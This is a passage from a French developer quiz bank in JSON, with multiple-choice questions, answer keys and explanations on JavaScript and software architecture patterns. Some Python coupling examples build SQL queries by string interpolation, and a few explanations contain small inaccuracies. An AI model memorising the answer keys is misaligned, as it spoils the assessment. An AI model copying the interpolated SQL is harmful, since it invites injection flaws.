                "array.append()",
                "array.insert()"
            ],
            "correct": 1,
            "explanation": "La méthode push() ajoute un ou plusieurs éléments à la fin d'un tableau et retourne la nouvelle longueur du tableau."
        },
        {
            "theme": "JS - JavaScript",
            "question": "Comment vérifier si une variable est de type 'string' ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "typeof variable === 'string'",
                "variable.isString()",
                "variable instanceof String",
                "String.isString(variable)"
            ],
            "correct": 0,
            "explanation": "L'opérateur typeof retourne le type de la variable sous forme de chaîne.\nPour vérifier si c'est une string, on compare avec 'string'."
        },
        {
            "theme": "JS - JavaScript",
            "question": "Qu'est-ce que le lazy loading ? Comment l'implémenter dans une application web ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Le lazy loading consiste à charger l'ensemble des ressources du site dès le premier affichage pour éviter des appels réseau ultérieurs. On l’implémente en regroupant tous les scripts dans un seul fichier.",
                "Le lazy loading est une technique qui précharge toutes les images et vidéos d'une page dans le cache du navigateur avant que l'utilisateur ne les voie, pour accélérer la navigation.",
                "Le lazy loading est une méthode de compression du code JavaScript et CSS, mise en place via des outils comme Webpack ou Babel, pour réduire la taille des fichiers.",
                "Le lazy loading (chargement paresseux) est une technique d'optimisation qui consiste à retarder le chargement de ressources non essentielles jusqu'à ce qu'elles soient nécessaires"
            ],
            "correct": 3,
            "explanation": "Le lazy loading (chargement paresseux) est une technique d'optimisation qui consiste à retarder le chargement de ressources non essentielles jusqu'à ce qu'elles soient nécessaires.\n\nDans le contexte web, cela s'applique généralement aux images, vidéos ou autres contenus lourds hors de la vue initiale de l'utilisateur.\n\nCette approche améliore les performances de chargement initial et économise la bande passante.\nPour implémenter le lazy loading dans une application web, on peut utiliser l'attribut HTML 'loading=\"lazy\"' sur les images."
        },
        {
            "theme": "JS - JavaScript",
            "question": "Qu'est-ce que le localStorage ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Le localStorage est une base de données externe utilisée par le navigateur pour stocker des fichiers volumineux comme des images et des vidéos.",
                "Le localStorage est une API web qui permet de stocker des données sous forme de paires clé-valeur dans le navigateur de l'utilisateur",
                "Le localStorage est un service cloud qui permet de sauvegarder automatiquement les données de l’utilisateur sur les serveurs de l’application",
                "Le localStorage est une mémoire temporaire utilisée uniquement pendant la session de navigation et effacée dès que l’utilisateur ferme le navigateur."
            ],
            "correct": 1,
            "explanation": "Le localStorage est une API web qui permet de stocker des données sous forme de paires clé-valeur dans le navigateur de l'utilisateur.\n\nCes données persistent même après la fermeture du navigateur, contrairement aux sessions. Le <b>localStorage</b> a une capacité de stockage plus importante que les cookies (généralement 5-10 Mo).\nPour l'utiliser, on emploie les méthodes setItem(key, value) pour stocker une valeur, getItem(key) pour la récupérer, removeItem(key) pour la supprimer, et <b>clear()</b> pour tout effacer.\nIl est important de noter que localStorage ne stocke que des chaînes de caractères, donc les objets doivent être sérialisés (par exemple avec JSON.stringify() ) avant d'être stockés.\n\nExemple d'utilisation du localStorage :\n\n//Stocker une valeur simple\nlocalStorage.setItem('username', 'John');\n// Récupérer une valeur\nlet name = localStorage.getItem('username');\nconsole.log(name); // Affiche : John \n\n// Stocker un objet (après sérialisation)\nconst user = { name: 'Alice', age: 30 };\nlocalStorage.setItem('user', JSON.stringify(user));\n\n// Récupérer et désérialiser un objet\nconst storedUser = JSON.parse(localStorage.getItem('user'));\nconsole.log(storedUser.name);\n\n// Affiche : Alice \n// Supprimer un élément\nlocalStorage.removeItem('username');\n\n// Effacer tout le localStorage\nlocalStorage.clear();"
        },
        {
            "theme": "JS - JavaScript",
            "question": "Qu'est-ce que le sessionStorage ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Le sessionStorage est un mécanisme de stockage web côté client, similaire au localStorage, mais avec une durée de vie limitée à la session de navigation",
                "Le sessionStorage est une base de données permanente du navigateur permettant de stocker des informations même après la fermeture du navigateur.",
                "Le sessionStorage est un espace de stockage partagé entre plusieurs onglets et fenêtres du même navigateur, accessible par toutes les sessions ouvertes du site",
                "Le sessionStorage est un service distant qui enregistre les données de session sur le serveur afin qu’elles soient disponibles pour tous les utilisateurs connectés"
            ],
            "correct": 0,
            "explanation": "Le sessionStorage est un mécanisme de stockage web côté client, similaire au localStorage, mais avec une durée de vie limitée à la session de navigation.\n\nLes données stockées persistent uniquement jusqu'à la fermeture de l'onglet ou de la fenêtre du navigateur, après quoi elles sont automatiquement effacées.\n\nCe mécanisme offre une capacité de stockage généralement plus importante que les cookies (environ 5-10 Mo) et est limité au domaine qui l'a créé, respectant le principe de même origine.\n\nIl stocke les données sous forme de paires clé-valeur de chaînes de caractères.\n\nLe sessionStorage est couramment utilisé pour stocker des données temporaires nécessaires pendant la navigation, sauvegarder l'état d'une application web entre les pages, ou gérer des informations de session sans recourir au serveur.\nIl offre ainsi un moyen pratique et sécurisé de gérer des données éphémères côté client, tout en garantissant qu'elles ne persistent pas au-delà de la session en cours."
        },
        {
            "theme": "JS - JavaScript",
            "question": "Qu'est-ce qu'un cookie ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un cookie est un fichier exécutable téléchargé sur l’ordinateur de l’utilisateur pour accélérer le chargement des sites web.",
                "Un cookie est un petit fichier texte stocké par un site web sur l'appareil de l'utilisateur",
                "Un cookie est une base de données locale utilisée par le navigateur pour stocker l’ensemble du contenu d’un site web.",
                "Un cookie est un type de cache temporaire utilisé uniquement pour améliorer les performances graphiques du navigateur."
            ],
            "correct": 1,
            "explanation": "Un cookie est un petit fichier texte stocké par un site web sur l'appareil de l'utilisateur.\nIl contient des informations sur la navigation et est renvoyé au site lors des visites ultérieures.\nLes cookies servent à mémoriser les préférences de l'utilisateur, maintenir une session, et suivre le comportement à des fins d'analyse ou de publicité.\n\nIl existe deux types principaux : \n\tles cookies first-party créés par le site visité, \n\tet les cookies third-party créés par d'autres domaines, souvent pour la publicité.\n\nLes cookies peuvent être persistants (conservés après la fermeture du navigateur) ou de session (supprimés à la fin de la session).\nLeur utilisation est réglementée dans de nombreux pays pour protéger la vie privée des utilisateurs.\nLes cookies sont souvent nécessaires dans la personnalisation de l'expérience web, mais soulèvent également des questions de confidentialité et de sécurité."
        },
        {
            "theme": "JS - JavaScript",
            "question": "Quelle est la différence entre let, const et var ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "var déclare une variable globale, let une variable locale et const une constante figée à la compilation",
                "Il n'y a aucune différence, ce sont des synonymes",
                "const empêche totalement la modification de l'objet auquel la variable fait référence",
                "var a une portée de fonction et un hoisting permissif, tandis que let et const ont une portée de bloc ; const empêche la réaffectation de la variable"
            ],
            "correct": 3,
            "explanation": "Les trois mots-clés ne se comportent pas de la même façon :\n- var : portée de fonction, remontée (hoisting) avec valeur undefined, redéclarable ;\n- let : portée de bloc, accessible seulement après sa déclaration (zone morte temporelle), réassignable mais non redéclarable dans le même bloc ;\n- const : portée de bloc, réaffectation impossible. Attention : si la valeur est un objet ou un tableau, son contenu reste modifiable (const verrouille le lien variable-valeur, pas le contenu).\nBonnes pratiques modernes : const par défaut, let seulement si on doit réassigner, var à éviter (code ES6+)."
        },
        {
            "theme": "JS - JavaScript",
            "question": "Qu'est-ce qu'une promesse (Promise) en JavaScript ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une promesse est un objet qui représente le résultat, réussi ou en échec, d'une opération asynchrone, avec trois états : pending, fulfilled, rejected",
                "Une promesse est une fonction qui s'exécute immédiatement et de manière synchrone",
                "Une promesse est un type de variable qui ne peut contenir qu'une seule valeur future",
                "Une promesse est une méthode du DOM pour réserver des éléments HTML avant leur chargement"
            ],
            "correct": 0,
            "explanation": "Une Promise encapsule une opération asynchrone et rend son résultat disponible plus tard.\nElle traverse trois états : pending (en attente), puis fulfilled (tenue) ou rejected (rejetée) - une fois résolue, son état est définitif.\nOn consomme le résultat avec :\n- .then(resultat => ...) pour le succès ;\n- .catch(erreur => ...) pour l'échec ;\n- .finally(...) dans tous les cas.\nLes promesses se chaînent, ce qui évite l'imbrication de callbacks ('callback hell').\nExemple :\nfetch(url)\n    .then(reponse => reponse.json())\n    .then(donnees => console.log(donnees))\n    .catch(erreur => console.error(erreur));\nPromise.all() permet d'attendre plusieurs promesses en parallèle. La syntaxe async/await est la façon moderne de les consommer."
        },
        {
            "theme": "JS - JavaScript",
            "question": "Qu'est-ce que l'asynchrone en JavaScript et pourquoi est-il important ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "L'asynchrone signifie que le navigateur exécute tout le code en double pour plus de fiabilité",
                "L'asynchrone permet de lancer une opération longue (requête réseau, timer...) sans bloquer l'exécution du reste du code, le résultat étant traité plus tard via un callback, une promesse ou async/await",
                "L'asynchrone consiste à attendre la fin d'une requête en gelant l'interface jusqu'à la réponse",
                "L'asynchrone est une technique qui accélère le processeur du serveur"
            ],
            "correct": 1,
            "explanation": "JavaScript est mono-thread : une seule chose à la fois. Sans asynchrone, une requête réseau lente figerait toute l'interface.\nLe modèle repose sur l'event loop :\n- le code synchrone s'exécute sur la pile d'appels ;\n- les opérations asynchrones (fetch, setTimeout, événements) sont déléguées à l'environnement (navigateur) ;\n- quand elles se terminent, leurs callbacks rejoignent une file et sont exécutés dès que la pile est vide.\nConséquence : les tâches longues n'empêchent pas la page de répondre.\nLes patterns historiques sont les callbacks, puis les promesses, et aujourd'hui la syntaxe async/await qui permet d'écrire du code asynchrone lisible comme du code synchrone."
        },
        {
            "theme": "JS - JavaScript",
            "question": "Comment fonctionne fetch() en JavaScript ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "fetch() envoie une requête HTTP de manière synchrone et retourne directement les données",
                "fetch() est une méthode jQuery obligatoire pour faire des appels réseau",
                "fetch() envoie une requête HTTP et retourne une promesse qui se résout avec un objet Response ; il faut ensuite lire le corps (response.json()) et gérer les erreurs",
                "fetch() télécharge un fichier sur le serveur et ne peut jamais échouer"
            ],
            "correct": 2,
            "explanation": "fetch() est l'API native du navigateur pour envoyer des requêtes HTTP.\nExemple d'appel GET :\nconst reponse = await fetch('https://api.exemple.fr/utilisateurs');\nif (!reponse.ok) {\n    throw new Error('Erreur HTTP : ' + reponse.status);\n}\nconst donnees = await reponse.json();\nPoints clés :\n- fetch() renvoie une promesse qui se résout avec un objet Response ;\n- le corps est asynchrone lui aussi : response.json() renvoie une nouvelle promesse ;\n- piège classique : la promesse n'est rejetée qu'en cas d'erreur réseau ; une réponse 404 ou 500 est une promesse tenue, d'où la vérification de reponse.ok.\nPour un POST :\nfetch(url, {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify(donnees)\n});"
        },
        {
            "theme": "JS - JavaScript",
            "question": "Quelle est la différence entre une fonction fléchée et une fonction classique ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Les fonctions fléchées s'exécutent plus rapidement que les fonctions classiques",
                "Les fonctions fléchées n'acceptent qu'un seul paramètre",
                "Une fonction fléchée ne crée pas son propre this (elle le capture du contexte englobant), a une syntaxe plus courte et ne peut pas être utilisée comme constructeur",
                "Les fonctions fléchées remplacent les fonctions classiques dans toutes les situations"
            ],
            "correct": 2,
            "explanation": "Syntaxe :\nconst somme = (a, b) => a + b; // return implicite\nDifférences principales avec une fonction classique (function) :\n- this : une fonction classique définit son propre this (l'objet appelant), une fonction fléchée capture le this du contexte où elle est créée. C'est très utile dans les callbacks et méthodes de classe ;\n- return implicite quand le corps est une seule expression ;\n- pas d'objet arguments, pas de constructeur (impossible de faire new sur une fonction fléchée).\nEn contrepartie, on évite les fonctions fléchées pour les méthodes d'objet où l'on veut un this dynamique, ou pour les gestionnaires d'événements qui ont besoin du this lié à l'élément."
        },
        {
            "theme": "JS - JavaScript",
            "question": "Qu'est-ce qu'un callback en JavaScript ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un callback est une fonction passée en paramètre d'une autre fonction, qui sera exécutée plus tard, par exemple lorsqu'une opération asynchrone se termine",
                "Un callback est une fonction qui rappelle automatiquement l'utilisateur par e-mail en cas d'erreur",
                "Un callback est une variable qui stocke l'historique des appels réseau du navigateur",
                "Un callback est un type de boucle qui s'exécute indéfiniment jusqu'à la réponse du serveur"
            ],
            "correct": 0,
            "explanation": "Un callback (fonction de rappel) est une fonction confiée à une autre fonction pour être appelée au bon moment.\nExemples courants :\n- événements : bouton.addEventListener('click', () => { ... }) ;\n- opérations asynchrones : la fonction est appelée quand la donnée arrive ou quand une erreur survient.\nFormat historique :\ngetUser(id, function(err, user) {\n    if (err) { gererErreur(err); return; }\n    afficher(user);\n});\nL'imbrication excessive de callbacks produit le 'callback hell', illisible. Les promesses puis async/await ont été introduits pour écrire ce même enchaînement de façon plus claire."
        }
    ],
    "L'architecture": [
        {
            "theme": "L'architecture",
            "question": "Qu'est-ce que le MVC ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Le MVC est un protocole réseau utilisé pour la communication entre serveurs et clients",
                "Le MVC est un langage de programmation orienté objet utilisé dans le développement web",
                "Le modèle Model-View-Controller (MVC) est un pattern architectural utilisé dans le développement d'applications, notamment pour les interfaces utilisateur",
                "Le MVC est une méthode de test utilisée pour vérifier la conformité du code source"
            ],
            "correct": 2,
            "explanation": "Le modèle Model-View-Controller (MVC) est un pattern architectural utilisé dans le développement d'applications, notamment pour les interfaces utilisateur.\n\nIl divise une application en trois composants principaux.\n\t- Le <b>modèle (Model)</b> représente la logique métier et les données de l'application. Il gère la récupération, la manipulation et la validation des données, sans contenir d'informations sur la manière dont les données sont affichées à l'utilisateur.\n\t- La <b>vue (View)</b> représente l'interface utilisateur. Elle affiche les données provenant du modèle et réagit aux changements dans le modèle pour mettre à jour l'affichage.\n\t- Le <b>contrôleur (Controller)</b> agit comme un intermédiaire entre le modèle et la vue. Il gère les entrées de l'utilisateur et les commandes, met à jour le modèle en fonction des actions de l'utilisateur et notifie la vue des changements.\n\nEn résumé, le MVC permet de séparer les préoccupations dans une application, facilitant ainsi la maintenance, la testabilité et la réutilisabilité du code."
        },
        {
            "theme": "L'architecture",
            "question": "Qu'est-ce que le MVT ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Le modèle Model-View-Template (MVT) est un pattern architectural utilisé principalement dans le framework Django pour le développement web",
                "Le MVT est une méthode d'analyse statistique des données appliquée au machine learning",
                "Le MVT est un modèle mathématique pour représenter les vecteurs et matrices dans un système linéaire",
                "Le MVT est un protocole de transfert de fichiers inspiré du MVC"
            ],
            "correct": 0,
            "explanation": "Le modèle Model-View-Template (MVT) est un pattern architectural utilisé principalement dans le framework Django pour le développement web.\nBien qu'il soit souvent présenté comme une variation du MVC, il a ses propres spécificités.\n\t- Le <b>modèle (Model)</b> est similaire au MVC. Il définit la structure des données, encapsule la logique métier et gère l'interaction avec la base de données.\n\t- La <b>vue (View)</b> dans MVT joue un rôle différent du MVC traditionnel.\nElle contient la logique de contrôle :\n elle reçoit les requêtes HTTP, interagit avec le modèle, et détermine quelles données doivent être passées au template.\n\t- Le <b>template (Template)</b> est spécifique à MVT. C'est un fichier HTML contenant du code de template Django, qui définit comment les données doivent être présentées. Il remplace en partie la 'vue' du MVC classique. \n\nDjango agit comme un contrôleur global, gérant le routage des URL vers les vues appropriées.\n\nCette structure MVT permet une séparation claire des responsabilités, facilitant le développement, la maintenance et la réutilisation du code dans les applications web Django."
        },
        {
            "theme": "L'architecture",
            "question": "Qu'est-ce que le MVVM ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Le MVVM est une base de données relationnelle utilisée pour la persistance des objets",
                "Le MVVM est un protocole réseau utilisé pour la communication entre microservices",
                "Le Model-View-ViewModel (MVVM) est un pattern architectural qui sépare le développement de l'interface graphique (la Vue) des règles métier et de la logique de présentation (le ViewModel) et des données (le Modèle)",
                "Le MVVM est une extension du modèle MVT utilisée dans les frameworks JavaScript modernes"
            ],
            "correct": 2,
            "explanation": "Le Model-View-ViewModel (<b>MVVM</b>) est un pattern architectural qui sépare le développement de l'interface graphique (la Vue) des règles métier et de la logique de présentation (le ViewModel) et des données (le Modèle).\n\t- Le <b>Modèle</b> représente les données et la logique métier de l'application, indépendamment de l'interface utilisateur.\n\t- La <b>Vue</b> est responsable de définir la structure, la mise en page et l'apparence de ce que l'utilisateur voit à l'écran. Dans MVVM, la Vue est idéalement passive et ne contient pas de logique métier.\n\t- Le <b>ViewModel</b> agit comme un intermédiaire entre le Modèle et la Vue.\nIl encapsule la logique de présentation et l'état de la Vue.\nLe ViewModel expose des propriétés et des commandes auxquelles la Vue peut se lier.\n\nMVVM utilise un mécanisme de liaison de données (data binding) pour connecter le ViewModel à la Vue, ce qui permet une séparation claire des préoccupations et facilite les tests unitaires de la logique de présentation.\n\n<b>Exemple en Python</b>: \n# Modèle\nclass User:\n    def __init__(self, name):\n        self.name = name\n\n# ViewModel\nclass UserViewModel:\n    def __init__(self, user):\n        self._user = user\n\n    def get_display_name(self):\n        return self._user.name.upper()\n\n# Vue (simulée)\nclass UserView:\n    def __init__(self, view_model):\n        self.view_model = view_model\n\n    def display_user(self):\n        print(f\"Nom: {self.view_model.get_display_name()}\")\n\n# Utilisation\nuser = User(\"Alice\")\nview_model = UserViewModel(user)\nview = UserView(view_model)\n\nview.display_user()"
        },
        {
            "theme": "L'architecture",
            "question": "Qu'est-ce qu'un design pattern ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un design pattern est un outil de mise en page graphique pour les interfaces utilisateur",
                "Un design pattern est une méthodologie de développement agile centrée sur le client",
                "Un design pattern est une solution réutilisable à un problème récurrent en conception logicielle",
                "Un design pattern est une librairie de composants visuels pour le front-end"
            ],
            "correct": 2,
            "explanation": "Un design pattern est une solution réutilisable à un problème récurrent en conception logicielle.\n\nIl s'agit d'un modèle éprouvé qui peut être adapté pour résoudre des problèmes similaires.\n\nLes design patterns ne sont pas des portions de code prêtes à l'emploi, mais plutôt des guides pour structurer et organiser le code de manière efficace.\n\nL'utilisation des design patterns optimise le processus de développement en fournissant des approches testées et validées par l'expérience collective des développeurs.\n\nIls améliorent la lisibilité du code et facilitent la communication au sein des équipes de développement en établissant un vocabulaire commun pour décrire les solutions architecturales."
        },
        {
            "theme": "L'architecture",
            "question": "Donnez des exemples de design patterns connus ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Voici quelques exemples de design patterns couramment utilisés : CREATIONAL PATTERNS - La Factory Method (ou fabrique)...",
                "Les design patterns incluent uniquement les algorithmes de tri et de recherche utilisés dans les bases de données",
                "Les design patterns concernent exclusivement la conception graphique des interfaces utilisateur",
                "Les design patterns sont des formats de fichiers utilisés pour structurer le code source en Java"
            ],
            "correct": 0,
            "explanation": "Voici quelques exemples de design patterns couramment utilisés :\n\n<b>CREATIONAL PATTERNS</b>\n\t- La Factory Method (ou fabrique) crée une classe mère, tout en délégant le choix de l'instanciation aux classes filles.\nElle permet de déléguer l'instanciation à des sous-classes, offrant ainsi une flexibilité dans la création d'objets.\n\t- L' Abstract Factory (ou fabrique abstraite) fournit une interface pour créer des familles d'objets liés ou dépendants sans spécifier leurs classes concrètes.\n\t- Le Singleton assure qu'une classe n'a qu'une et une seule instance et fournit un accès généralisé à cette même instance.\n\t- Le Builder (ou moniteur) sépare la construction d'un objet complexe de sa représentation permettant l'élaboration d'objets complexes étape par étape, en utilisant un code de construction identique.\n\n<b>STRUCTURAL PATTERNS</b>\n\t- L' Adapter (ou adaptateur) fait fonctionner ensemble des interfaces incompatibles.\nIl permet à des classes de travailler ensemble malgré des interfaces incompatibles.\n\t- Le Decorator (ou décorateur) ajoute des responsabilités à des objets dynamiquement.\nIl permet d'ajouter de nouvelles fonctionnalités à un objet existant sans altérer sa structure.\n\t- La Facade (ou Façade) fournit une interface unifiée à un ensemble d'interfaces.\nElle offre une interface simplifiée à un système complexe.\n\n<b>BEHAVORIAL PATTERNS</b>\n\t- L' Observer (ou observateur) définit une dépendance un-à-plusieurs entre objets.\nIl permet à un objet de notifier automatiquement un ensemble d'objets dépendants lorsque son état change.\n\t- La Strategy (ou strategy) encapsule des algorithmes interchangeables.\nElle permet de définir une famille d'algorithmes, de les encapsuler et de les rendre interchangeables.\n\t- La Command (ou commande) encapsule une requête comme un objet.\nElle transforme une demande en un objet autonome contenant toutes les informations sur cette demande."
        },
        {
            "theme": "L'architecture",
            "question": "Qu'est-ce qu'une factory method ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Une factory method est un design pattern qui permet de créer des objets sans spécifier explicitement leur classe exacte",
                "Une factory method est une commande du terminal permettant de compiler plusieurs classes Java",
                "Une factory method est une fonction utilisée pour détruire des objets inutilisés dans la mémoire",
                "Une factory method est un protocole utilisé pour échanger des données entre applications distantes"
            ],
            "correct": 0,
            "explanation": "Une factory method est un design pattern qui permet de créer des objets sans spécifier explicitement leur classe exacte.\nAu lieu d'utiliser directement l'opérateur new pour instancier un objet, on fait appel à une méthode appelée fabrique.\nCette méthode fabrique encapsule la logique de création des objets, ce qui signifie que les objets sont toujours créés avec l'opérateur new, mais cette opération se déroule à l'intérieur de la méthode fabrique.\n\nLes objets ainsi créés sont souvent appelés produits.\nUne des caractéristiques clés du patron Fabrique est que les sous-classes peuvent redéfinir la méthode fabrique pour changer le type de produit qu'elles retournent.\nCela permet une grande flexibilité dans le code, car il devient possible d'ajouter de nouveaux types de produits sans modifier le code client qui utilise la méthode fabrique.\nCependant, il est important de noter que tous les produits doivent partager une interface ou une classe de base commune.\nCela garantit que même si les sous-classes retournent des types différents, elles respectent toutes la même structure et peuvent être utilisées de manière interchangeable.\n\nEn résumé, le patron de conception Fabrique offre une approche élégante et flexible pour la création d'objets.\nIl facilite l'extensibilité du code et permet un découplage entre le code client et les classes concrètes des produits, rendant ainsi le système plus modulaire et adaptable aux changements futurs.\n\nclass Animal:\n    def speak(self):\n        pass\n\nclass Dog(Animal):\n    def speak(self):\n        return \"Woof!\"\n\nclass Cat(Animal):\n    def speak(self):\n        return \"Meow!\"\n\nclass AnimalFactory:\n    def create_animal(self, animal_type):\n        if animal_type == \"dog\":\n            return Dog()\n        elif animal_type == \"cat\":\n            return Cat()\n        else:\n            raise ValueError(\"Unknown animal type\")\n\n# Utilisation\nfactory = AnimalFactory()\ndog = factory.create_animal(\"dog\")\ncat = factory.create_animal(\"cat\")\nprint(dog.speak())  # Output: Woof!\nprint(cat.speak())  # Output: Meow!"
        },
        {
            "theme": "L'architecture",
            "question": "Qu'est-ce que le singleton ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Le singleton est un modèle mathématique utilisé pour isoler les variables dans un système",
                "Le singleton est un design pattern créationnel qui garantit qu'une classe n'a qu'une seule instance et fournit un point d'accès global à cette instance",
                "Le singleton est un type de base de données utilisée pour gérer les sessions utilisateurs",
                "Le singleton est un protocole réseau de communication un-à-plusieurs"
            ],
            "correct": 1,
            "explanation": "Le singleton est un design pattern créationnel qui garantit qu'une classe n'a qu'une seule instance et fournit un point d'accès global à cette instance.\nIl est utile pour contrôler l'accès à une ressource partagée, comme une connexion à une base de données.\nCi-dessous un exemple en <b>Java</b>\n\n public class Singleton {\n    private static Singleton instance;\n\n    private Singleton() {\n        // Constructeur privé pour empêcher\n        // l'instanciation directe\n    }\n\n    public static Singleton getInstance() {\n        if (instance == null) {\n            instance = new Singleton();\n        }\n        return instance;\n    }\n\n    public void showMessage() {\n        System.out.println(\"Hello, I am a singleton!\");\n    }\n}\n\n// Utilisation\nSingleton singleton = Singleton.getInstance();\nsingleton.showMessage();\n// Output: Hello, I am a singleton!"
        },
        {
            "theme": "L'architecture",
            "question": "Qu'est-ce que le couplage fort ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Le couplage fort est une technique de chiffrement des échanges entre composants logiciels",
                "Le couplage fort décrit un système où chaque composant peut être remplacé indépendamment",
                "Le couplage fort est une architecture orientée microservices favorisant la modularité",
                "Le couplage fort est un principe de conception qui décrit une relation où les composants d'un système sont très liés entre eux"
            ],
            "correct": 3,
            "explanation": "Le couplage fort est un principe de conception qui décrit une relation où les composants d'un système sont très liés entre eux.\nCe couplage engendre l' antipattern que l'on nomme trivialement plat de spaghetti.\n\nclass DatabaseManager:\n    def __init__(self):\n        self.connection = \"Database connection\"\n\n    def execute_query(self, query):\n        print(f\"Executing query: {query}\")\n\nclass UserService:\n    def __init__(self):\n        self.db_manager = DatabaseManager()\n\n    def get_user(self, user_id):\n        # Accès direct à la méthode de DatabaseManager\n        query = f\"SELECT * FROM users WHERE id = {user_id}\"\n        self.db_manager.execute_query(query)\n\nDans un système à couplage fort, les composants sont étroitement dépendants, ce qui signifie que des modifications dans la classe DatabaseManager affecteront directement la classe UserService.\nCela rend le code moins flexible et plus difficile à maintenir.\nLe couplage fort entraîne une difficulté de test , car chaque composant doit être testé en conjonction avec les autres.\nUne modification dans un composant peut nécessiter des ajustements dans plusieurs autres, augmentant ainsi le risque d'erreurs.\n\nCette approche limite également la réutilisabilité des composants, car un composant fortement couplé comme UserService ne peut pas être utilisé dans d'autres contextes sans inclure tous les autres composants dont il dépend, comme DatabaseManager."
        },
        {
            "theme": "L'architecture",
            "question": "Qu'est-ce que le couplage faible ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Le couplage faible est une technique de compression de données utilisée pour optimiser les échanges",
                "Le couplage faible est un principe de conception qui vise à réduire les dépendances entre les composants d'un système",
                "Le couplage faible est un modèle d’intelligence artificielle basé sur des réseaux neuronaux",
                "Le couplage faible est une méthode d’optimisation mémoire pour les applications embarquées"
            ],
            "correct": 1,
            "explanation": "Le couplage faible est un principe de conception qui vise à réduire les dépendances entre les composants d'un système.\n\nclass IDatabaseManager:\n    def execute_query(self, query):\n        pass\n\nclass MySQLManager(IDatabaseManager):\n    def execute_query(self, query):\n        print(f\"Executing MySQL query: {query}\")\n\nclass PostgreSQLManager(IDatabaseManager):\n    def execute_query(self, query):\n        print(f\"Executing PostgreSQL query: {query}\")\n\nclass UserService:\n    def __init__(self, db_manager: IDatabaseManager):\n        self.db_manager = db_manager\n\n    def get_user(self, user_id):\n        query = f\"SELECT * FROM users WHERE id = {user_id}\"\n        self.db_manager.execute_query(query)\n\n# Utilisation\nmysql_manager = MySQLManager()\nuser_service = UserService(mysql_manager)\nuser_service.get_user(1) \n\nDans un système à couplage faible, chaque composant peut donc évoluer indépendamment, ce qui signifie que des modifications dans les classes MySQLManager ou PostgreSQLManager n'affecteront pas directement la classe UserService, tant que l'interface IDatabaseManager reste la même.\nLe couplage faible favorise l' encapsulation , où les détails internes d'un composant sont cachés, réduisant ainsi les risques d'erreurs.\nCette approche facilite également les tests, permettant de vérifier chaque composant indépendamment, par exemple en utilisant des mocks pour IDatabaseManager lors des tests de UserService.\nEnfin, elle améliore la flexibilité et la réutilisabilité , permettant d'utiliser UserService avec différents types de bases de données sans modification."
        },
        {
            "theme": "L'architecture",
            "question": "Quelle est la différence entre le couplage fort et faible ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Le couplage fort est utilisé pour les applications front-end, le couplage faible pour le back-end",
                "Le couplage fort nécessite une base de données centralisée alors que le couplage faible ne l’utilise pas",
                "Le couplage fort implique des composants totalement indépendants, contrairement au couplage faible",
                "On parle de couplage fort ou serré lorsque deux entités échangent beaucoup d'informations, de couplage faible lorsqu'elles échangent peu d'information"
            ],
            "correct": 3,
            "explanation": "On parle de couplage fort ou serré lorsque deux entités échanges beaucoup d'informations, de couplage faible lorsqu'elles échangent peu d'information.\n\nExemple de couplage fort\nclass DatabaseManager:\n    def __init__(self):\n        self.connection = \"Database connection\"\n\n    def execute_query(self, query):\n        print(f\"Executing query: {query}\")\n\nclass UserService:\n    def __init__(self):\n        self.db_manager = DatabaseManager()\n\n    def get_user(self, user_id):\n        query = f\"SELECT * FROM users WHERE id = {user_id}\"\n        self.db_manager.execute_query(query)\n\n# Utilisation\nuser_service = UserService()\nuser_service.get_user(1) \n\nExemple de couplage faible\nclass IDatabaseManager:\n    def execute_query(self, query):\n        pass\n\nclass MySQLManager(IDatabaseManager):\n    def execute_query(self, query):\n        print(f\"Executing MySQL query: {query}\")\n\nclass PostgreSQLManager(IDatabaseManager):\n    def execute_query(self, query):\n        print(f\"Executing PostgreSQL query: {query}\")\n\nclass UserService:\n    def __init__(self, db_manager: IDatabaseManager):\n        self.db_manager = db_manager\n\n    def get_user(self, user_id):\n        query = f\"SELECT * FROM users WHERE id = {user_id}\"\n        self.db_manager.execute_query(query)\n\n# Utilisation\nmysql_manager = MySQLManager()\npostgres_manager = PostgreSQLManager()\n\nuser_service_mysql = UserService(mysql_manager)\nuser_service_mysql.get_user(1)\n\nuser_service_postgres = UserService(postgres_manager)\nuser_service_postgres.get_user(1) \n\nNiveau encapsulation :\nDans le couplage faible, la classe IDatabaseManager encapsule la méthode execute_query et les classes dérivées l'implémentent.\nDans le couplage fort, DatabaseManager est directement utilisé. \n\nNiveau dépendance :\nLe couplage faible permet d'injecter différents types de gestionnaires de base de données dans UserService, le rendant moins dépendant d'une implémentation spécifique. \n\nNiveau flexibilité :\nLe couplage faible permet de changer facilement le type de base de données utilisé sans affecter UserService, tant que l'interface IDatabaseManager est respectée. \n\nNiveau testabilité :\nLe couplage faible facilite les tests unitaires en permettant d'injecter des mock objects pour IDatabaseManager. \n\nNiveau maintenabilité :\nLes changements dans les classes de gestion de base de données avec un couplage faible ont moins de chances d'affecter la classe UserService."
        },
        {
            "theme": "L'architecture",
            "question": "Pourquoi avoir choisi cette architecture pour votre solution ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Parce que c'est la seule architecture que le framework imposait, sans autre possibilité",
